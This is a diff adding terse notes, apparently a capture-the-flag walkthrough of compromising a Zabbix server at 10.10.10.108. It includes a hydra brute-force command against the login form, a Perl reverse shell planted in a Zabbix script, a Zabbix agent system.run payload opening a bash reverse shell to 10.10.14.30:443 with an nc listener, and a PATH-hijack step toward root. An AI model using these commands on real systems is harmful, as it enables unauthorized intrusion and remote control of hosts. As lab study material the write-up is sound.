@@ -1,0 +1,42 @@
+we got 80 port open
+
+dirb we find http://10.10.10.108/zabbix/
+
+we got guest access
+
+after hydra we got username and passw but not gui only cli
+
+
+hydra -L test -P test -u  -s 80 -m "/zabbix/index.php:name=^USER^&password=^PASS^&enter=Sign in:Login name or password is incorrect" 10.10.10.108 http-form-post 
+
+we dont have a gui access i install zabbix cli tools
+
+i change the permition to gui access
+
+show_users
+
+add_user_from_usergroup
+
+remove_user_from_usergroup
+
+
+then we have access in script i just insert my perl reverse shell
+
+i got reversell back
+
+then need zapper access in backup file
+
+got ssh id_rsa
+
+second method
+echo "system.run[(/bin/bash -c 'bash -i >/dev/tcp/10.10.14.30/443 0<&1 2>&1 &')]" | nc 172.17.0.1 10050
+nc -lvnp 443
+
+
+root priv
+
+export PATH=/home/zapper/utils:$PATH
+
+echo $path 
+
+which systemctl
